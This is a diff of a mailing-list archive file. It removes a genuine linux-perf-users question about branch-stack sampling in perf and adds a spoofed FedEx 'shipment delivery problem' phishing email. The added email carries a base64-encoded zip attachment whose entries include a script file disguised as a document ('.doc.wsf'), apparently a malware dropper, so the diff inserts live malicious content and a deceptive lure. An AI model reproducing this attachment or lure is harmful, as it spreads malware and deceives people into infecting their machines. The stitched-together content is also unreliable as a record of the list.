@@ -1,61 +1,148 @@
-From: Jonas Wagner <jonas.wagner@epfl.ch>
-Subject: Problems with -b, and confusing error messages
-Date: Tue, 4 Oct 2016 17:02:58 +0200
-Message-ID: <CAMRJFfLVEHrJ3zqExY=SMzuw8TS7V5A4sy5N2vW9moL=uYvYvg@mail.gmail.com>
+From: "FedEx International Economy" <sergio.potter@frizellgroup.com>
+Subject: Shipment delivery problem #00000986325
+Date: Tue, 4 Oct 2016 16:40:27 -0700
+Message-ID: <139c0fa24cb6f9894008084dec961caf@frizellgroup.com>
+Reply-To: "FedEx International Economy" <sergio.potter@frizellgroup.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: multipart/mixed;
+        boundary="b1_072db95ca5db36d49ed2d73d03f60946"
+Content-Transfer-Encoding: 8bit
 Return-path: <linux-perf-users-owner@vger.kernel.org>
-Received: from smtp5.epfl.ch ([128.178.224.8]:38426 "EHLO smtp5.epfl.ch"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1752745AbcJDPDp (ORCPT
+Received: from p3nlsmtp15.shr.prod.phx3.secureserver.net ([72.167.234.240]:39390
+        "EHLO p3nlsmtp15.shr.prod.phx3.secureserver.net" rhost-flags-OK-OK-OK-OK)
+        by vger.kernel.org with ESMTP id S1752877AbcJDXs7 (ORCPT
         <rfc822;linux-perf-users@vger.kernel.org>);
-        Tue, 4 Oct 2016 11:03:45 -0400
-Received: by mail-wm0-f50.google.com with SMTP id f193so172994385wmg.0
-        for <linux-perf-users@vger.kernel.org>; Tue, 04 Oct 2016 08:03:40 -0700 (PDT)
+        Tue, 4 Oct 2016 19:48:59 -0400
+Received: from p3nlhg897.shr.prod.phx3.secureserver.net (localhost [127.0.0.1])
+        by p3nlhg897.shr.prod.phx3.secureserver.net (8.14.4/8.12.11) with ESMTP id u94NeRVP017296
+        for <linux-perf-users@vger.kernel.org>; Tue, 4 Oct 2016 16:40:27 -0700
 Sender: linux-perf-users-owner@vger.kernel.org
 List-ID: <linux-perf-users.vger.kernel.org>
 To: linux-perf-users@vger.kernel.org
 
-Hello,
+--b1_072db95ca5db36d49ed2d73d03f60946
+Content-Type: text/plain; charset=us-ascii
 
-I would like to ask for help, because perf stopped working when I
-enable taken branch stack sampling (with the -b option). Here are a
-few examples:
+Dear Customer,
 
-$ perf record -b /bin/true
-Error:
-'precise' request may not be supported. Try removing 'p' modifier.
+Courier was unable to deliver the parcel to you.
+You can review complete details of your order in the find attached.
 
-$ perf record -b -e cycles /bin/true
-Error:
-No hardware sampling interrupt available.
-No APIC? If so then you can boot the kernel with the "lapic" boot
-parameter to force-enable it.
+Regards,
+Sergio Potter,
+Support Manager.
 
-$ perf record -e cycles /bin/true
-[ perf record: Woken up 1 times to write data ]
-[ perf record: Captured and wrote 0.014 MB perf.data (8 samples) ]
 
-$ perf record -e cycles:p /bin/true
-[ perf record: Woken up 1 times to write data ]
-[ perf record: Captured and wrote 0.014 MB perf.data (9 samples) ]
+--b1_072db95ca5db36d49ed2d73d03f60946
+Content-Type: application/zip; name="Label_00000986325.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Label_00000986325.zip
 
-$ cat /proc/cmdline
-BOOT_IMAGE=/boot/vmlinuz-4.4.0-38-generic
-root=UUID=a5440a73-d559-4b61-808c-2430cd67ba25 ro quiet lapic
+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
 
-I have a couple questions about this:
 
-1. What's wrong? Branch stack sampling used to work on this machine...
-how can I make it work again?
-2. Apparently, the problem is not related to the precise modifier, or
-the lapic boot parameter. Could we make these error messages more
-meaningful?
-
-Note regarding (1): I recently upgraded the kernel on this machine
-from 4.4.0-36-generic to 4.4.0-38-generic, on Ubuntu Xenial. Using the
-previous kernel, perf worked fine. It's tricky for me to undo the
-update though :(
-
-Help would be appreciated. Happy to provide more logs if needed. Thanks!
-Jonas
+--b1_072db95ca5db36d49ed2d73d03f60946--
